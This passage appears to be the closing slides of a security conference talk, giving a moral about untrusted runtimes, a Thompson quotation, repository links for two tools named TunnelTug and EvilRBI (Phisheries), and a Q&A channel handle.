The Moral is Obvious. You cannot trust a runtime that you do not own and understand yourself. Modern defense mechanisms attempt to enforce security on top of layers of massive, opaque, multi-million-line monolithic engines controlled by third parties. When you rely on an ecosystem you do not fundamentally manage, any boundary you draw is merely an illusion of safety. Ultimately, your security posture is entirely at the mercy of the underlying execution environment's emergent complexity. No amount of cryptographic boundaries or layered complexity can cure this foundational weakness.

Thompson, 1984: You can't trust code that you did not totally create yourself. (Reflections on Trusting Trust, 1984)

## Slide 45

### DEFENSIVE BLUEPRINT

\```
Tool Repos
\```

**TunnelTug**

- https://github.com/TunnelTug/TunnelTug
- https://tunneltug.com

**EvilRBI (Phisheries)**

- https://github.com/EvilRBI/phisheries
- https://evilrbi.com

## Slide 46

### QA

\```
Defcon.Chat
\```

\```
Channel: #qa-reflections_on_disregarding_trust
Handle: @1umberhack
\```

